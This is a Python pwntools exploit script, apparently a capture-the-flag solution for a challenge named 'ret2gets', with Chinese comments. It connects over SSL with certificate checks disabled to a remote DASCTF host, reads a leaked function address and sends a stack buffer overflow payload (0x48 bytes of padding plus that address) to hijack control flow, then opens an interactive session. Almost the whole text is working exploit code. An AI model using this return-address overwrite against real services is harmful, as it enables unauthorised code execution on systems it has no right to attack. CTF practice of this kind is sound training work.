# python3 ret2gets.py REMOTE  #运行时加remote
from pwn import *
import ssl
s       = lambda data               : io.send(data)
sa      = lambda delim, data        : io.sendafter(str(delim), data)
sl      = lambda data               : io.sendline(data)
sla     = lambda delim, data        : io.sendlineafter(str(delim), data)
r       = lambda num                : io.recv(num)
ru      = lambda delims, drop=True  : io.recvuntil(delims, drop)
itr     = lambda                   : io.interactive()
uu32    = lambda data              : u32(data.ljust(4, b'\x00'))
uu64    = lambda data              : u64(data.ljust(8, b'\x00'))
context.log_level = 'debug'
#context.binary = binary = './ret2gets'
gdbscript = '''
'''
def start(argv=[], *a, **kw):
    if args.GDB:
        proc = process([binary] + argv, *a, **kw)
        gdb.attach(proc, gdbscript=gdbscript)
        return proc
    elif args.REMOTE:
        ssl_ctx = ssl.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE
        host = '55f09a17d93980962bb47b24.tcp-ctf2.dasctf.com'
        port = 9999
        return remote(host, port, ssl=True, ssl_context=ssl_ctx)
    else:
        return process([binary] + argv, *a, **kw)

io = start()
io.recvuntil(b"WOW:")
leak_data = io.recvline()   #代码输出win函数地址，需要接受并发送
backdoor_addr = int(leak_data.strip(),16)
payload = b'a'*0x48+p64(backdoor_addr)
sl(payload)
itr()